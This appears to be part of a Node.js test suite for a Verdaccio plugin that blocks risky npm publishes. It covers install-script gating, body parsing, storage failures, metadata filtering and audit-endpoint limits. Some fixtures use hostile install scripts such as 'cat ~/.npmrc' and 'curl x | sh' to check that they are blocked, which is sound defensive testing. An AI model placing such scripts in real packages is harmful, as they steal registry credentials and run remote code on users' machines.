      const server = await startServer(
        makeInstance({
          blockPublishWithNewScripts: false,
          blockPublishMatches: false,
          block: ['bad-pkg'],
        }),
        storage,
      );
      try {
        const {status} = await put(server, '/bad-pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(status, 201);
      } finally {
        server.close();
      }
    },
  );

  // --- request bodies (verdaccio/verdaccio#1912) and the gate's entry ---

  // Mirrors @verdaccio/middleware's own log.js (checked against its
  // installed source in 6.7.4 and 6.10.6): an unconditional
  // req.on('data', ...) purely to count bytes, which switches the request
  // stream into flowing mode on every request.
  function verdaccioLogMiddlewareMirror(req, res, next) {
    let bytesin = 0;
    req.on('data', chunk => {
      bytesin += chunk.length;
    });
    next();
  }

  // Counts how often the gate reads storage, so a test can prove it never
  // did.
  function countingStorage() {
    const storage = makeFakeStorage();
    const read = storage.localStorage.getPackageMetadata;
    storage.reads = 0;
    storage.localStorage.getPackageMetadata = (...args) => {
      storage.reads += 1;
      return read(...args);
    };
    return storage;
  }

  const largePublish = {
    versions: {'1.0.0': withScripts({})},
    filler: 'x'.repeat(75000), // realistic publish-with-provenance size
  };

  await check(
    "6.7.4 order (log.js, then plugins, then Verdaccio's parser): a large JSON PUT reaches the gate whole",
    async () => {
      const server = await startServer(makeInstance(), makeFakeStorage(), {
        before: [verdaccioLogMiddlewareMirror],
      });
      try {
        const result = await put(server, '/pkg', largePublish);
        assert.equal(result.status, 201, JSON.stringify(result.body));
        assert.ok(result.body.versions);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'an async middleware ahead of this one that pauses the request (as generic-oidc and oidc-auth do) leaves the body intact',
    async () => {
      function pausingAsyncAuth(req, res, next) {
        req.pause();
        setTimeout(() => {
          req.resume();
          next();
        }, 50);
      }
      const server = await startServer(makeInstance(), makeFakeStorage(), {
        before: [verdaccioLogMiddlewareMirror, pausingAsyncAuth],
      });
      try {
        const result = await put(server, '/pkg', largePublish);
        assert.equal(result.status, 201, JSON.stringify(result.body));
        assert.ok(result.body.versions);
      } finally {
        server.close();
      }
    },
  );

  await check(
    "6.10.6 order (Verdaccio's parser before the plugins): the already-parsed body is used, and still gated",
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('pkg', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage, {
        before: [
          verdaccioLogMiddlewareMirror,
          require('body-parser').json({strict: false, limit: '10mb'}),
        ],
      });
      try {
        const result = await put(server, '/pkg', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'node x.js'}),
          },
        });
        assert.equal(result.status, 403, JSON.stringify(result.body));
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a JSON PUT over max_body_size gets 413 and never reaches storage',
    async () => {
      const storage = countingStorage();
      const server = await startServer(
        makeInstance({}, {config: {max_body_size: '1kb'}}),
        storage,
      );
      try {
        const result = await put(server, '/pkg', largePublish);
        assert.equal(result.status, 413);
        assert.equal(storage.reads, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a non-JSON content type is never read by this plugin, so it never buffers it',
    async () => {
      const sent = 'x'.repeat(50000);
      const server = await startServer(makeInstance(), makeFakeStorage(), {
        final: (req, res) => {
          let received = 0;
          req.on('data', chunk => (received += chunk.length));
          req.on('end', () => res.status(200).json({received}));
        },
      });
      try {
        const {port} = server.address();
        for (const type of [
          'text/json',
          'application/x-json',
          'application/octet-stream',
        ]) {
          const res = await fetch(`http://127.0.0.1:${port}/pkg`, {
            signal: AbortSignal.timeout(10000),
            method: 'PUT',
            headers: {'content-type': type},
            body: sent,
          });
          assert.equal(res.status, 200, type);
          assert.equal((await res.json()).received, sent.length, type);
        }
      } finally {
        server.close();
      }
    },
  );

  await check('a non-PUT request is never read by this plugin', async () => {
    const server = await startServer(makeInstance(), makeFakeStorage(), {
      final: (req, res) => res.status(200).json({parsed: req._body === true}),
    });
    try {
      const {port} = server.address();
      const res = await fetch(`http://127.0.0.1:${port}/pkg`, {
        signal: AbortSignal.timeout(10000),
        method: 'POST',
        headers: {'content-type': 'application/json'},
        body: '{"versions":{}}',
      });
      assert.equal((await res.json()).parsed, false);
    } finally {
      server.close();
    }
  });

  await check(
    "a caller who may not publish the package never reaches storage, the tarball check or the webhook; Verdaccio's own route answers them",
    async () => {
      const hook = http.createServer((req, res) => {
        hook.hits += 1;
        res.end();
      });
      hook.hits = 0;
      await new Promise(resolve => hook.listen(0, '127.0.0.1', resolve));
      const storage = countingStorage();
      const auth = makeFakeAuth();
      const instance = new SecurityFilter(
        {blockPublishMatches: true, blockPublishWithNewScripts: true},
        {
          logger: NOOP_LOGGER,
          config: {
            filters: {
              '@fortmesa/verdaccio-security-filter': {
                block: ['evil-*'],
                sensitivePaths: {enabled: true, block: true},
                webhook: {url: `http://127.0.0.1:${hook.address().port}/`},
              },
            },
          },
        },
      );
      const server = await startServer(instance, storage, {
        auth,
        remoteUser: {name: undefined, groups: ['$all', '$anonymous']},
        final: (req, res) => res.status(401).json({error: 'route said no'}),
      });
      try {
        const result = await put(server, '/evil-pkg', {
          versions: {'1.0.0': withScripts({postinstall: 'cat ~/.npmrc'})},
        });
        assert.equal(result.status, 401);
        assert.equal(result.body.error, 'route said no');
        assert.deepEqual(auth.calls, [
          {packageName: 'evil-pkg', user: undefined},
        ]);
        assert.equal(storage.reads, 0);
        await new Promise(resolve => setTimeout(resolve, 100));
        assert.equal(hook.hits, 0);
      } finally {
        server.close();
        hook.close();
      }
    },
  );

  await check(
    'a publish through /:package/-rev/:revision is gated like a fresh one',
    async () => {
      const storage = makeFakeStorage();
      storage.setExisting('pkg', {'1.0.0': withScripts({})});
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/pkg/-rev/3-abcdef', {
          versions: {
            '1.0.0': withScripts({}),
            '1.1.0': withScripts({postinstall: 'curl x | sh'}),
          },
          _attachments: {'pkg-1.1.0.tgz': {data: ''}},
        });
        assert.equal(result.status, 403);
        assert.match(result.body.reason, /1\.1\.0/);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a scoped name is gated under its real name however the slash is written',
    async () => {
      const auth = makeFakeAuth();
      const instance = makeInstance(
        {blockPublishMatches: true},
        {
          config: {
            filters: {
              '@fortmesa/verdaccio-security-filter': {block: ['@evil/*']},
            },
          },
        },
      );
      const server = await startServer(instance, makeFakeStorage(), {auth});
      try {
        for (const path of [
          '/@evil/pkg',
          '/%40evil/pkg',
          '/@evil%2fpkg',
          '/%40evil%2Fpkg',
        ]) {
          const result = await put(server, path, {
            versions: {'1.0.0': withScripts({})},
          });
          assert.equal(result.status, 403, path);
          assert.match(result.body.reason, /@evil\/pkg@1\.0\.0/, path);
        }
        assert.ok(auth.calls.every(c => c.packageName === '@evil/pkg'));
      } finally {
        server.close();
      }
    },
  );

  await check(
    "Verdaccio's own /-/ endpoints and paths deeper than the publish route are never gated",
    async () => {
      const auth = makeFakeAuth();
      const server = await startServer(makeInstance(), makeFakeStorage(), {
        auth,
      });
      try {
        for (const path of [
          '/-/user/org.couchdb.user:x',
          '/-/package/pkg/dist-tags/latest',
          '/pkg/-/pkg-1.0.0.tgz/-rev/1-abc',
        ]) {
          const result = await put(server, path, {
            versions: {'1.0.0': withScripts({postinstall: 'x'})},
          });
          assert.equal(result.status, 201, path);
        }
        assert.equal(auth.calls.length, 0);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a version value that is not an object gets 400, and nothing crashes',
    async () => {
      const unhandled = [];
      const onRejection = err => unhandled.push(err);
      process.on('unhandledRejection', onRejection);
      const server = await startServer(makeInstance({}, {}), makeFakeStorage());
      try {
        for (const value of [null, 'x', 7, ['a']]) {
          const result = await put(server, '/pkg', {
            versions: {'1.0.0': value},
          });
          assert.equal(result.status, 400, JSON.stringify(value));
        }
        await new Promise(resolve => setTimeout(resolve, 50));
        assert.deepEqual(unhandled, []);
      } finally {
        server.close();
        process.off('unhandledRejection', onRejection);
      }
    },
  );

  await check(
    'a scripts field that is not an object carries no install scripts, and nothing crashes',
    async () => {
      const unhandled = [];
      const onRejection = err => unhandled.push(err);
      process.on('unhandledRejection', onRejection);
      const storage = makeFakeStorage();
      storage.setExisting('pkg', {'1.0.0': withScripts({})}, {latest: '1.0.0'});
      const instance = new SecurityFilter(
        {blockPublishWithNewScripts: true, blockPublishMatches: true},
        {
          logger: NOOP_LOGGER,
          config: {
            filters: {
              '@fortmesa/verdaccio-security-filter': {
                scriptHeuristics: {enabled: true, blockShellPipe: true},
                sensitivePaths: {enabled: true, block: true},
              },
            },
          },
        },
      );
      const server = await startServer(instance, storage);
      try {
        for (const scripts of ['boom', 7, ['postinstall'], null]) {
          const result = await put(server, '/pkg', {
            versions: {'1.0.0': withScripts({}), '1.1.0': {scripts}},
          });
          assert.equal(result.status, 201, JSON.stringify(scripts));
        }
        await new Promise(resolve => setTimeout(resolve, 50));
        assert.deepEqual(unhandled, []);
      } finally {
        server.close();
        process.off('unhandledRejection', onRejection);
      }
    },
  );

  await check(
    "the gate's baseline is raw local storage, not Verdaccio's filtered view",
    async () => {
      // Both stored versions are clean. The filtered view (what
      // storage.getPackage() returns) has had them removed -- too new for
      // minDays, say -- which would leave no clean baseline to compare a
      // newly introduced install script against.
      const storage = makeFakeStorage();
      storage.setExisting('pkg', {
        '1.0.0': withScripts({}),
        '1.1.0': withScripts({}),
      });
      storage.filteredView('pkg', {});
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/pkg', {
          versions: {'1.2.0': withScripts({postinstall: 'node x.js'})},
        });
        assert.equal(result.status, 403);
      } finally {
        server.close();
      }
    },
  );

  await check(
    "a package never stored here is checked against its uplink's history, read through Verdaccio",
    async () => {
      const storage = makeFakeStorage();
      // Not in raw local storage; storage.getPackage() (with uplinksLook)
      // finds the upstream copy.
      storage.filteredView('upstream-pkg', {'1.0.0': withScripts({})});
      const seen = [];
      const getPackage = storage.getPackage;
      storage.getPackage = options => {
        seen.push(options.uplinksLook);
        return getPackage(options);
      };
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/upstream-pkg', {
          versions: {'2.0.0': withScripts({postinstall: 'node x.js'})},
        });
        assert.equal(result.status, 403);
        assert.deepEqual(seen, [true]);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'an uplink that cannot be reached leaves no baseline, as for a brand-new name',
    async () => {
      const storage = makeFakeStorage();
      storage.getPackage = ({callback}) =>
        callback(Object.assign(new Error('uplink timeout'), {status: 500}));
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/new-pkg', {
          versions: {'1.0.0': withScripts({postinstall: 'node x.js'})},
        });
        assert.equal(result.status, 201);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a storage read that fails (other than not-found) rejects the publish with 503',
    async () => {
      const storage = makeFakeStorage();
      storage.localStorage.getPackageMetadata = (name, callback) =>
        callback(Object.assign(new Error('s3 down'), {status: 500}));
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/pkg', {
          versions: {'1.0.0': withScripts({postinstall: 'x'})},
        });
        assert.equal(result.status, 503);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'a storage read that throws instead of calling back still gets an answer, never a hang or a pass',
    async () => {
      const storage = makeFakeStorage();
      storage.localStorage.getPackageMetadata = () => {
        throw new Error('storage plugin threw');
      };
      const server = await startServer(makeInstance(), storage);
      try {
        const result = await put(server, '/pkg', {
          versions: {'1.0.0': withScripts({postinstall: 'x'})},
        });
        assert.equal(result.status, 500);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'an internal error inside the publish check answers 500 and never lets the publish through',
    async () => {
      const throwingStore = {
        check() {
          throw new Error('store exploded');
        },
      };
      const server = await startServer(
        makeInstance(
          {blockPublishMatches: true},
          {maliciousPackageStore: throwingStore},
        ),
        makeFakeStorage(),
      );
      try {
        const result = await put(server, '/pkg', {
          versions: {'1.0.0': withScripts({})},
        });
        assert.equal(result.status, 500);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'register_middlewares() refuses to start the gates without allow_publish or raw local storage',
    () => {
      const instance = makeInstance();
      assert.throws(
        () =>
          instance.register_middlewares({use() {}}, null, makeFakeStorage()),
        /auth\.allow_publish/,
      );
      assert.throws(
        () =>
          instance.register_middlewares({use() {}}, makeFakeAuth(), {
            getPackage() {},
          }),
        /localStorage\.getPackageMetadata/,
      );
    },
  );

  // --- filter_metadata() fails closed ---

  await check(
    'filter_metadata: malformed version entries are removed or ignored without aborting the rest of the filter',
    async () => {
      const instance = new SecurityFilter(
        {
          scriptHeuristics: {enabled: true, blockShellPipe: true},
          sensitivePaths: {enabled: true, block: true},
        },
        {logger: NOOP_LOGGER, config: {}},
      );
      const info = makePackageInfo('pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
        '1.1.0': {publishedAt: daysAgo(20), scripts: 'boom'},
        '1.2.0': {publishedAt: daysAgo(10), scripts: 7},
        'not-semver': {publishedAt: daysAgo(9)},
        '2.0.0': {publishedAt: daysAgo(0)}, // too new
      });
      info.versions['1.3.0'] = null;
      info.time['1.3.0'] = daysAgo(5);
      info['dist-tags'].latest = '2.0.0';
      const result = await instance.filter_metadata(info);
      assert.deepEqual(Object.keys(result.versions).sort(), [
        '1.0.0',
        '1.1.0',
        '1.2.0',
        'not-semver',
      ]);
      assert.equal(result['dist-tags'].latest, '1.2.0');
    },
  );

  await check(
    'filter_metadata: an unparseable publish time counts as unknown, and is blocked',
    async () => {
      const instance = new SecurityFilter(
        {},
        {logger: NOOP_LOGGER, config: {}},
      );
      const info = makePackageInfo('pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
        '1.1.0': {publishedAt: 'not a date'},
      });
      const result = await instance.filter_metadata(info);
      assert.deepEqual(Object.keys(result.versions), ['1.0.0']);
    },
  );

  await check(
    'filter_metadata: a packument with no time field has its versions removed without throwing',
    async () => {
      const instance = new SecurityFilter(
        {allow: ['kept-*']},
        {logger: NOOP_LOGGER, config: {}},
      );
      const info = makePackageInfo('pkg', {
        '1.0.0': {publishedAt: daysAgo(30)},
      });
      delete info.time;
      const result = await instance.filter_metadata(info);
      assert.deepEqual(result.versions, {});
    },
  );

  await check(
    'filter_metadata: a version whose check throws is removed, and the others are still filtered normally',
    async () => {
      const instance = new SecurityFilter(
        {},
        {
          logger: NOOP_LOGGER,
          config: {},
          maliciousPackageStore: {
            check(name, ver) {
              if (ver === '1.1.0') throw new Error('bad entry');
              return null;
            },
          },
        },
      );
      const info = makePackageInfo(
        'pkg',
        {
          '1.0.0': {publishedAt: daysAgo(30)},
          '1.1.0': {publishedAt: daysAgo(20)},
          '1.2.0': {publishedAt: daysAgo(0)},
        },
        {latest: '1.2.0'},
      );
      const result = await instance.filter_metadata(info);
      assert.deepEqual(Object.keys(result.versions), ['1.0.0']);
      assert.equal(result['dist-tags'].latest, '1.0.0');
    },
  );

  await check(
    'filter_metadata: a failure outside the per-version checks removes every version the allow list does not cover',
    async () => {
      const instance = new SecurityFilter(
        {allow: [{pkg: {versions: '1.0.0'}}]},
        {logger: NOOP_LOGGER, config: {}},
      );
      instance._filterMetadata = async () => {
        throw new Error('unexpected');
      };
      const info = makePackageInfo(
        'pkg',
        {
          '1.0.0': {publishedAt: daysAgo(30)},
          '1.1.0': {publishedAt: daysAgo(20)},
        },
        {latest: '1.1.0'},
      );
      const result = await instance.filter_metadata(info);
      assert.deepEqual(Object.keys(result.versions), ['1.0.0']);
      assert.equal(result['dist-tags'].latest, '1.0.0');
    },
  );

  // --- audit endpoints: bounded work ---

  async function post(server, path, body) {
    const {port} = server.address();
    const res = await fetch(`http://127.0.0.1:${port}${path}`, {
      method: 'POST',
      headers: {'content-type': 'application/json'},
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(10000),
    });
    return {status: res.status, body: await res.json().catch(() => null)};
  }

  // Charges the budget the way the real store does: one per version
  // against each advisory a package has (30 here, for every package).
  const thirtyCveStore = {
    check: () => null,
    getCveAdvisories(name, versions, budget) {
      if (budget) {
        budget.remaining -= versions.length * 30;
        if (budget.remaining < 0) {
          throw Object.assign(new Error('spent'), {code: 'ADVISORY_BUDGET'});
        }
      }
      return [];
    },
  };

  await check(
    'advisories/bulk refuses too many versions for one package, or in all, with 413',
    async () => {
      const instance = new SecurityFilter(
        {},
        {
          logger: NOOP_LOGGER,
          config: {},
          maliciousPackageStore: thirtyCveStore,
        },
      );
      const server = await startServer(instance, makeFakeStorage());
      try {
        const versions = n => Array.from({length: n}, (_, i) => `1.0.${i}`);
        assert.equal(
          (
            await post(server, '/-/npm/v1/security/advisories/bulk', {
              a: versions(1001),
            })
          ).status,
          413,
        );
        const many = Object.fromEntries(
          Array.from({length: 60}, (_, i) => [`pkg${i}`, versions(1000)]),
        );
        assert.equal(
          (await post(server, '/-/npm/v1/security/advisories/bulk', many))
            .status,
          413,
        );
        // Duplicates count once.
        assert.equal(
          (
            await post(server, '/-/npm/v1/security/advisories/bulk', {
              a: Array(5000).fill('1.0.0'),
            })
          ).status,
          200,
        );
      } finally {
        server.close();
      }
    },
  );

  await check(
    'advisories/bulk refuses a request whose version-against-advisory checks pass the budget, with 413',
    async () => {
      const instance = new SecurityFilter(
        {},
        {
          logger: NOOP_LOGGER,
          config: {},
          maliciousPackageStore: thirtyCveStore,
        },
      );
      const server = await startServer(instance, makeFakeStorage());
      try {
        const versions = Array.from({length: 1000}, (_, i) => `1.0.${i}`);
        const body = Object.fromEntries(
          Array.from({length: 10}, (_, i) => [`pkg${i}`, versions]),
        );
        const result = await post(
          server,
          '/-/npm/v1/security/advisories/bulk',
          body,
        );
        assert.equal(result.status, 413);
      } finally {
        server.close();
      }
    },
  );

  await check(
    'audits/quick refuses a dependency graph larger than its visit budget with 413, not a partial report',
    async () => {
      const instance = new SecurityFilter(
        {},
        {
          logger: NOOP_LOGGER,
          config: {},
          maliciousPackageStore: thirtyCveStore,
        },
      );
      const server = await startServer(instance, makeFakeStorage());
      try {
        // 900 packages each requiring the next 500 (fewer near the end):
        // about 325k edges, well past the 250k-edge walk.
        const names = Array.from({length: 900}, (_, i) => `p${i}`);
        const dependencies = {};
        names.forEach((name, i) => {
          dependencies[name] = {
            version: '1.0.0',
            requires: Object.fromEntries(
              names.slice(i + 1, i + 501).map(n => [n, '^1.0.0']),
            ),
          };
        });
        const started = Date.now();
        const result = await post(server, '/-/npm/v1/security/audits/quick', {
          requires: {p0: '^1.0.0'},
          dependencies,
        });
        assert.equal(result.status, 413, JSON.stringify(result.body));
        assert.ok(Date.now() - started < 5000);
      } finally {
        server.close();
      }
    },
  );

  console.log(`\n${passed} check(s) passed.`);
}

main().catch(err => {
  console.error(err);
  process.exitCode = 1;
});
